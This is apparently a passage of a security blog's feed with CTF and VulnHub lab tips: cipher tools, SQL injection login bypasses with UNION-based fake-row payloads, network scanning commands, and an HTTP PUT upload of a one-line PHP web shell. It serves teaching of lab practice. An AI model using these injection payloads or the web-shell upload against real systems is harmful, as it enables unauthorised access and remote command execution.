</span><span class='line'>0000010: 0400 0101 0040 2020 0000 000b 0000 000b  .....@  ........
</span><span class='line'>0000020: 0000 0000 0000 0000 0000 0002 0000 0004  ................</span></code></pre></td></tr></table></div></figure>

</li>

<li>GIF to JPG
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>convert animation.gif target.png</span></code></pre></td></tr></table></div></figure></li>
<li>If the pdf-parser contains
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>    /ProcSet [/PDF/Text/ImageC/ImageI]
</span><span class='line'>    /ProcSet [/PDF/Text/ImageC/ImageI]</span></code></pre></td></tr></table></div></figure>
It means it will contain text which can be extracted by using
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pdf2txt Untitled-1_1a110935ec70b63ad09fec68c89dfacb.pdf 
</span><span class='line'>PCTF{how_2_pdf_yo}</span></code></pre></td></tr></table></div></figure></li>
</ol>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Learning From CTF : Cryptography]]></title>
    <link href="http://bitvijays.github.io/blog/2014/11/08/learning-from-ctf-cryptography/"/>
    <updated>2014-11-08T00:55:31+05:30</updated>
    <id>http://bitvijays.github.io/blog/2014/11/08/learning-from-ctf-cryptography</id>
    <content type="html"><![CDATA[<p>This post (Work in Progress) lists the tips and tricks while doing Cryptography challenges during various CTF&rsquo;s.</p>

<!-- more -->


<ol>
<li>Caesar cipher and substitution cipher can be solved by using <a href="https://www.cryptool.org/en/cryptool1-en">Cryptool 1</a>. Just check the Analysis option, there&rsquo;s analysis for Symmetric Key, Asymmetric Key, Hash and others. Otherwise, a good website to solve substitution cipher is <a href="http://quipqiup.com/">Quipqiup</a>.
<br></li>
<li>If you get some text atleast few paragraphs and some random numbers as (1, 9, 4) (4, 2, 8) (4, 8, 3) (7, 1, 5) (8, 10, 1), it might mean (Paragraph, Line, Word).
<br></li>
<li>If you get some ciphertext encrypted by XOR, <a href="https://github.com/hellman/xortool">xortool</a> might be helpful. It can help you to find the key length and the key.</li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Learning From CTF : Web Exploitation]]></title>
    <link href="http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-web-exploitation/"/>
    <updated>2014-11-07T00:32:50+05:30</updated>
    <id>http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-web-exploitation</id>
    <content type="html"><![CDATA[<p>This post (Work in Progress) lists the tips and tricks while doing Web Exploitation challenges during various CTF&rsquo;s.</p>

<!-- more -->


<ol>
<li> You may want to use your browser to view the source of the web page. Sometimes, important information is hidden using comments.</li>
<br>
<li> It may be helpful to learn how to 'Inspect Elements' in your browser. It helps you to distinguish each element which might be or not be hidden. </li>
<br>
<li> Some symbols need to be URL Encoded when included in GET requests.
<br>
<table cellpadding="6px" border="1" style="border:1px solid #C0C0C0; border-collapse:collapse; background-color:white;">
<caption>Reserved characters after percent-encoding</caption>
<tr>
<td><code>!</code></td>
<td><code>#</code></td>
<td><code>$</code></td>
<td><code>&amp;</code></td>
<td><code>'</code></td>
<td><code>(</code></td>
<td><code>)</code></td>
<td><code>*</code></td>
<td><code>+</code></td>
<td><code>,</code></td>
<td><code>/</code></td>
<td><code>:</code></td>
<td><code>;</code></td>
<td><code>=</code></td>
<td><code>?</code></td>
<td><code>@</code></td>
<td><code>[</code></td>
<td><code>]</code></td>
</tr>
<tr>
<td><code>%21</code></td>
<td><code>%23</code></td>
<td><code>%24</code></td>
<td><code>%26</code></td>
<td><code>%27</code></td>
<td><code>%28</code></td>
<td><code>%29</code></td>
<td><code>%2A</code></td>
<td><code>%2B</code></td>
<td><code>%2C</code></td>
<td><code>%2F</code></td>
<td><code>%3A</code></td>
<td><code>%3B</code></td>
<td><code>%3D</code></td>
<td><code>%3F</code></td>
<td><code>%40</code></td>
<td><code>%5B</code></td>
<td><code>%5D</code></td>
</tr>
</table>
<br>
<table cellpadding="6px" border="1" style="border:1px solid #C0C0C0; border-collapse:collapse; background-color:white;">
<caption>Common characters after percent-encoding (ASCII or UTF-8 based)</caption>
<tr>
<td>newline</td>
<td>space</td>
<td><code>"</code></td>
<td><code>%</code></td>
<td><code>-</code></td>
<td><code>.</code></td>
<td><code>&lt;</code></td>
<td><code>&gt;</code></td>
<td><code>\</code></td>
<td><code>^</code></td>
<td><code>_</code></td>
<td><code>`</code></td>
<td><code>{</code></td>
<td><code>|</code></td>
<td><code>}</code></td>
<td><code>~</code></td>
</tr>
<tr>
<td><code>%0A</code> <i>or</i> <code>%0D</code> <i>or</i> <code>%0D%0A</code></td>
<td><code>%20</code></td>
<td><code>%22</code></td>
<td><code>%25</code></td>
<td><code>%2D</code></td>
<td><code>%2E</code></td>
<td><code>%3C</code></td>
<td><code>%3E</code></td>
<td><code>%5C</code></td>
<td><code>%5E</code></td>
<td><code>%5F</code></td>
<td><code>%60</code></td>
<td><code>%7B</code></td>
<td><code>%7C</code></td>
<td><code>%7D</code></td>
<td><code>%7E</code></td>
</tr>
</table>
</li>
<br>
<li> In some web exploitation challenges, if the secret is stored on the client side and there are some javascript involved, you could possibly find the answer in the Javascript console, Browser Developer Tools.  (F12 Key).</li>
<br>
<li>Websites keep track of you (Whether you are login-ed or not) by keeping a cookie for you, check that if the value (if easy and most probably assigned linearly) of cookie can be changed to any user who might already be logined.</li>
<br>
<li>If the Login prompt contains SQL query and check contains only one result if (mysqli_num_rows($result) !== 1), then use limit 1 such as admin' or 1=1 limit 1;#
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$username = $_POST["username"];
</span><span class='line'>$password = $_POST["password"];
</span><span class='line'>$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
</span><span class='line'>$result = mysqli_query($con, $query);
</span><span class='line'>
</span><span class='line'>if (mysqli_num_rows($result) !== 1) {
</span><span class='line'>  echo "&lt;h1&gt;Login failed.&lt;/h1&gt;";
</span><span class='line'>} else {
</span><span class='line'>  echo "&lt;h1&gt;Logged in!&lt;/h1&gt;";
</span><span class='line'>  echo "&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;";
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
</li>
<li>If the Login prompt contains SQL query and checks only one result, plus have extra checks (see example below), then we can create a fake row SQL whose value we control.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$con = mysqli_connect("localhost", "sql2", "sql2", "sql2");
</span><span class='line'>$username = $_POST["username"];
</span><span class='line'>$password = $_POST["password"];
</span><span class='line'>$query = "SELECT * FROM users WHERE username='$username'";
</span><span class='line'>$result = mysqli_query($con, $query);
</span><span class='line'>
</span><span class='line'>$logged_in = false;
</span><span class='line'>if (mysqli_num_rows($result) === 1) {
</span><span class='line'>  $row = mysqli_fetch_array($result);
</span><span class='line'>  if ($row["password"] === $password) {
</span><span class='line'>    $logged_in = true;
</span><span class='line'>    echo "&lt;h1&gt;Logged in!&lt;/h1&gt;";
</span><span class='line'>    echo "&lt;pre&gt;User level: ", $row["user_level"],  "&lt;/pre&gt;";
</span><span class='line'>    if ($row["user_level"] &gt;= 1337) {
</span><span class='line'>      echo "&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;";
</span><span class='line'>    } else {
</span><span class='line'>      echo "&lt;p&gt;Only user levels 1337 or above can see the flag.&lt;/p&gt;";
</span><span class='line'>    }
</span><span class='line'>  }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
You have to create a fake query such as
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>random'AND 1=0 UNION ALL SELECT 'admin' AS username, 'hax' AS password, 2000 AS user_level --
</span><span class='line'>where  
</span><span class='line'>The ' closes the username string and 1=0 will always return false, invalidating the first half.
</span><span class='line'>The union all statement allows us to concatenate two SQL select queries, so we append UNION ALL and then our fake select statement.</span></code></pre></td></tr></table></div></figure>
Don't forget to enter the same password in the password field :P
</li>
<br>
<li>Perl Script running on a webpage, read <a href="http://www.cgisecurity.com/lib/sips.html">Security Issues in Perl Scripts</a></li>
<br>
<li>In some web exploitation excercises, you can modify the GET/POST request in the burpsuite to get the flag.</li>
<br>
</ol>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Learning From VulnHub]]></title>
    <link href="http://bitvijays.github.io/blog/2014/11/03/learning-from-vulnhub/"/>
    <updated>2014-11-03T22:10:21+05:30</updated>
    <id>http://bitvijays.github.io/blog/2014/11/03/learning-from-vulnhub</id>
    <content type="html"><![CDATA[<p>This post (Work in Progress) mark downs the learning gathered by doing the vulnerable machines provided by the VulnHub. Once you download the virtual machine from the website and run it in VMware or Virtual Box, below steps could be followed to find the vulnerabilties.</p>

<!-- more -->


<p><ol></p>

<p><li><strong>Finding the IP address</strong>:</p>

<p><ul>
<li><strong>Netdiscover</strong>:  an active/passive arp reconnaissance tool
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netdiscover [options]
</span><span class='line'>-i interface : The network interface to sniff and inject packets.
</span><span class='line'>-r range     : Scan a given range instead of auto scan.
</span><span class='line'>
</span><span class='line'>Example: netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24</span></code></pre></td></tr></table></div></figure>
<figure class='code'><figcaption><span>Interface name for Virtualization Software</span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Virtualbox   : vboxnet
</span><span class='line'>Vmware       : vmnet</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li><strong>Nmap</strong>: Network exploration tool and security / port scanner
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap [Scan Type] [Options] {target specification}
</span><span class='line'>-sP/-sn Ping Scan - disable port scan
</span><span class='line'>Example: nmap -sP/-sn 192.168.1.0/24</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li></p>

<p><li><strong>Port Scanning the system</strong>:
<br>
Port scanning provides a large amount of information on open services and possible exploits that target these services.
Two options
<ul>
<li><strong>Unicornscan</strong>:  port scanner that utilizes it’s own userland TCP/IP stack, which allows it to run a asynchronous scans. Faster than nmap and can scan 65,535 ports in a relatively shorter time frame.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unicornscan [options] X.X.X.X/YY:S-E
</span><span class='line'>-i, &ndash;interface      : interface name, like eth0 or fxp1, not normally required
</span><span class='line'>-m, &ndash;mode           : scan mode, tcp (syn) scan is default, U for udp T for tcp `sf' for tcp connect scan and A for arp
</span><span class='line'>                 for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn|FIN|NO Push|URG)
</span><span class='line'>
</span><span class='line'>Address ranges are cidr like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask then /32 is implied.
</span><span class='line'>Port ranges are like 1-4096 with 53 only scanning one port, a for all 65k and p for 1-1024
</span><span class='line'>
</span><span class='line'>example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for gateway.</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li><strong>Nmap</strong>: Network exploration tool and security / port scanner
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap [Scan Type] [Options] {target specification}
</span><span class='line'>HOST DISCOVERY:
</span><span class='line'>-sL: List Scan - simply list targets to scan
</span><span class='line'>-sn: Ping Scan - disable port scan
</span><span class='line'>-Pn: Treat all hosts as online &ndash; skip host discovery
</span><span class='line'>
</span><span class='line'>SCAN TECHNIQUES:
</span><span class='line'>-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
</span><span class='line'>-sU: UDP Scan
</span><span class='line'>-sN/sF/sX: TCP Null, FIN, and Xmas scans
</span><span class='line'>
</span><span class='line'>PORT SPECIFICATION:
</span><span class='line'>-p &lt;port ranges>: Only scan specified ports
</span><span class='line'>Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
</span><span class='line'>
</span><span class='line'>SERVICE/VERSION DETECTION:
</span><span class='line'>-sV: Probe open ports to determine service/version info
</span><span class='line'>
</span><span class='line'>OUTPUT:
</span><span class='line'>-oN/-oX/-oS/-oG &lt;file>: Output scan in normal, XML, s|&lt;rIpt kIddi3, and Grepable format, respectively, to the given filename.
</span><span class='line'>-oA &lt;basename>: Output in the three major formats at once
</span><span class='line'>-v: Increase verbosity level (use -vv or more for greater effect)
</span><span class='line'>
</span><span class='line'>MISC:
</span><span class='line'>-6: Enable IPv6 scanning
</span><span class='line'>-A: Enable OS detection, version detection, script scanning, and tracerout</span></code></pre></td></tr></table></div></figure>
</li></p>

<p>As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. <a href="https://twitter.com/superkojiman">superkojiman</a> has written a script for this available at <a href="https://github.com/superkojiman/onetwopunch">GitHub</a>.</p>

<p><li>When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is  usually  SMTP,  port  80  mostly HTTP.   However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine what application is running.</p>

<p>By using <strong>amap</strong>, we can identify if any SSL server is running on port 3445 or some oracle listener on port 23. Also, it will actually do an SSL connect if you want and then try to identify the SSL-enabled protocol! One of the VM in vulnhub was running http and https on the same port.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>amap -A 192.168.1.2 12380
</span><span class='line'>amap v5.4 (www.thc.org/thc-amap) started at 2016-08-10 05:48:09 - APPLICATION MAPPING mode
</span><span class='line'>
</span><span class='line'>Protocol on 192.168.1.2:12380/tcp matches http
</span><span class='line'>Protocol on 192.168.1.2:12380/tcp matches http-apache-2
</span><span class='line'>Protocol on 192.168.1.2:12380/tcp matches ntp
</span><span class='line'>Protocol on 192.168.1.2:12380/tcp matches ssl
</span><span class='line'>
</span><span class='line'>Unidentified ports: none.
</span><span class='line'>
</span><span class='line'>amap v5.4 finished at 2016-08-10 05:48:16</span></code></pre></td></tr></table></div></figure></li>
</ul>
</li></p>

<p><br></p>

<p><li><strong>Listen to the interface</strong>: We should always listen to the local interface on which the VM is hosted such as vboxnet0 or vmnet using wireshark or tcpdump. Many VMs send data randomly, for example, In one of the VM, it does the arp scan and sends a SYN packet on the port 4444, if something is listening on that port, it send the data.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>18:02:04.096292 IP 192.168.56.101.36327 &gt; 192.168.56.1.4444: Flags [S], seq 861815232, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 4127458640 ecr 0], length 0
</span><span class='line'>18:02:04.096330 IP 192.168.56.1.4444 &gt; 192.168.56.101.36327: Flags [R.], seq 0, ack 861815233, win 0, length 0
</span><span class='line'>18:02:04.098567 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
</span><span class='line'>18:02:04.098584 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
</span><span class='line'>18:02:04.100756 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28
</span><span class='line'>18:02:04.100773 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28</span></code></pre></td></tr></table></div></figure>
On listening on the port 4444, we recieve a base64 encoded string
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -lvp 4444
</span><span class='line'>listening on [any] 4444 &hellip;
</span><span class='line'>192.168.56.101: inverse host lookup failed: Unknown host
</span><span class='line'>connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
</span><span class='line'>&hellip;V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi&hellip;</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li><strong>From Nothing to a Unprivileged Shell</strong>:
<br>
At this point, you would have an idea about the different services and service version running on the system.</p>

<p><ol>
<li><strong>searchsploit</strong>: Exploit Database Archive Search.
<br>
First, we need to check if the operating system is using any services which are vulnerable or the exploit is already available in the internet.
For example, A vulnerable service webmin is present in one of the VM which can be exploited to extract information from the system.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -sV -A 172.16.73.128
</span><span class='line'><strong><strong><strong><strong><strong>Trimmed</strong></strong></strong></strong></strong><strong><strong>
</span><span class='line'>10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
</span><span class='line'>|<em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
</span><span class='line'>|</em>http-title: Site doesn&rsquo;t have a title (text/html; Charset=iso-8859-1).
</span><span class='line'>| ndmp-version:
</span><span class='line'>|_  ERROR: Failed to get host information from server
</span><span class='line'></strong></strong><strong><strong><strong>Trimmed</strong></strong></strong><strong><strong><strong><strong></span></code></pre></td></tr></table></div></figure>
If we search for webmin in searchsploit, we will find different exploits available for it and we just have to use the correct one based on the utility and the version matching.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# searchsploit webmin
</span><span class='line'></strong></strong></strong></strong><strong>Trimmed</strong><strong><strong><strong><strong><strong><strong>
</span><span class='line'> Description                                                                            Path
</span><span class='line'>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-
</span><span class='line'>Webmin &lt; 1.290 / Usermin &lt; 1.220 Arbitrary File Disclosure Exploit                   | /multiple/remote/1997.php
</span><span class='line'>Webmin &lt; 1.290 / Usermin &lt; 1.220 Arbitrary File Disclosure Exploit (perl)            | /multiple/remote/2017.pl
</span><span class='line'>Webmin 1.x HTML Email Command Execution Vulnerability                                | /cgi/webapps/24574.txt
</span><span class='line'></strong></strong></strong></strong></strong>Trimmed</strong><strong><strong>********</span></code></pre></td></tr></table></div></figure>
</strong>Insert searchsploit -xml options </strong>
</li></p>

<p><li><strong>Webserver Opportunities</strong>?:
If a webserver is running on the machine, we can start with running
<ul>whatweb to find what server is running. Further, we can execute nikto, w3af to find any vulnerabilities. dirb to find any hidden directories.
<li>
<strong>PUT Method</strong>: Sometimes, it is also a good option to check for the various OPTIONS available on the website such as GET, PUT, DELETE etc.</p>

<p>Curl command can be used to check the options available:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl -X OPTIONS -v <a href="http://192.168.126.129/test/">http://192.168.126.129/test/</a>
</span><span class='line'><em>   Trying 192.168.126.129&hellip;
</span><span class='line'></em> Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
</span><span class='line'>&gt; OPTIONS /test/ HTTP/1.1
</span><span class='line'>&gt; Host: 192.168.126.129
</span><span class='line'>&gt; User-Agent: curl/7.47.0
</span><span class='line'>&gt; Accept: <em>/</em>
</span><span class='line'>&gt;
</span><span class='line'>&lt; HTTP/1.1 200 OK
</span><span class='line'>&lt; DAV: 1,2
</span><span class='line'>&lt; MS-Author-Via: DAV
</span><span class='line'>&lt; Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
</span><span class='line'>&lt; Allow: OPTIONS, GET, HEAD, POST
</span><span class='line'>&lt; Content-Length: 0
</span><span class='line'>&lt; Date: Fri, 29 Apr 2016 09:41:19 GMT
</span><span class='line'>&lt; Server: lighttpd/1.4.28
</span><span class='line'>&lt;
</span><span class='line'>* Connection #0 to host 192.168.126.129 left intact</span></code></pre></td></tr></table></div></figure>
The put method allows you to upload a file. Eventually, you can upload a php file which can work as a shell. There are multiple methods to upload the file as mentioned in <a href="http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html">Detecting and exploiting the HTTP Put Method</a>.</p>

<p>The few are
<ul>
<li>
Nmap:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 80 &ndash;script http-put &ndash;script-args http-put.url=&lsquo;/uploads/rootme.php&rsquo;,http-put.file=&lsquo;/tmp/rootme.php&rsquo;</span></code></pre></td></tr></table></div></figure>
</li>
<li>
curl:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl &ndash;upload-file test.txt -v &ndash;url <a href="http://192.168.126.129/test/test.txt">http://192.168.126.129/test/test.txt</a></span></code></pre></td></tr></table></div></figure>
or
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl -X PUT -d &lsquo;&lt;?php system($_GET[&ldquo;cmd&rdquo;]);&rsquo; <a href="http://192.168.56.103/test/cmd.php">http://192.168.56.103/test/cmd.php</a></span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li></p>

<p><li>Wordpress: When running wpscan, also make sure you run --enumerate u for enumerating usernames. By default wpscan doesn&rsquo;t run it.
Also, scan for plugins
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wpsscan
</span><span class='line'>&ndash;url       | -u &lt;target url&gt;       The WordPress URL/domain to scan.
</span><span class='line'>&ndash;force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
</span><span class='line'>&ndash;enumerate | -e [option(s)]        Enumeration.
</span><span class='line'>  option :
</span><span class='line'>    u        usernames from id 1 to 10
</span><span class='line'>    u[10-20] usernames from id 10 to 20 (you must write [] chars)
</span><span class='line'>    p        plugins
</span><span class='line'>    vp       only vulnerable plugins
